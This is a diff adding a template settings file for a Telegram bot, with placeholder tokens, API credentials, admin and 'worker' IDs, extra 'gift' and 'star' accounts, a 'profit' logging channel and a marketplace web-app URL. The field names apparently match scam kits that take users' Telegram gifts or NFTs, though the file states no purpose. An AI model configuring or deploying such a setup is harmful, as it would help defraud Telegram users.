@@ -1,0 +1,40 @@
+{
+  "_comment": "=== TELEGRAM BOT CONFIGURATION ===",
+  "_comment_1": "Copy this file to settings.json and fill in your own values",
+  "_comment_2": "DO NOT COMMIT settings.json to version control!",
+  
+  "_section_bot": "=== TELEGRAM BOT ===",
+  "bot_token": "YOUR_BOT_TOKEN_HERE",
+  "control_bot_token": "",
+  
+  "_section_telegram_api": "=== TELEGRAM API ===",
+  "api_id": 27696098,
+  "api_hash": "YOUR_API_HASH_HERE",
+  
+  "_section_web": "=== WEB APPLICATION ===",
+  "webapp_url": "https://your-marketplace-domain.com",
+  
+  "_section_users": "=== ADMINISTRATORS & WORKERS ===",
+  "admin_ids": [123456789],
+  "workers": [123456789],
+  "target_user": "@your_username",
+  
+  "_section_accounts": "=== ADDITIONAL ACCOUNTS ===",
+  "star_account_phone": 1234567890,
+  "star_account_api_id": 27696098,
+  "star_account_api_hash": "YOUR_API_HASH_HERE",
+  
+  "gift_account_phone": 1234567890,
+  "gift_account_api_id": 27696098,
+  "gift_account_api_hash": "YOUR_API_HASH_HERE",
+  
+  "_section_channels": "=== LOGGING CHANNELS ===",
+  "maintenance_mode": false,
+  "profit_channel_id": -1001234567890,
+  "logs_channel_id": -1001234567891,
+  
+  "_section_urls": "=== TELEGRAM URLs ===",
+  "telegram_api_url": "https://t.me",
+  "about_link": "https://t.me/your_channel",
+  "nft_fragment_url": "https://t.me/nft"
+}
